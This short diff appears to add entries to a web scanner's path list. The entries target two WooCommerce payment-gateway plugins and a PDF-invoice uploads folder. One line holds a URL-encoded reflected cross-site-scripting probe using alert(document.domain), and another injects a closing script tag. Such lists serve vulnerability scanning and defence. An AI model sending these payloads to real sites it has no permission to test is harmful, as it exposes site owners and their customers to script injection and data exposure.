@@ -1,0 +1,4 @@
+
+/wp-content/plugins/swipehq-payment-gateway-woocommerce/test-plugin.php?api_url=api_url%27%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3E 
+/wp-content/plugins/sagepay-server-gateway-for-woocommerce/includes/pages/redirect.php?page=</script>
+/wp-content/uploads/pdf-invoices/
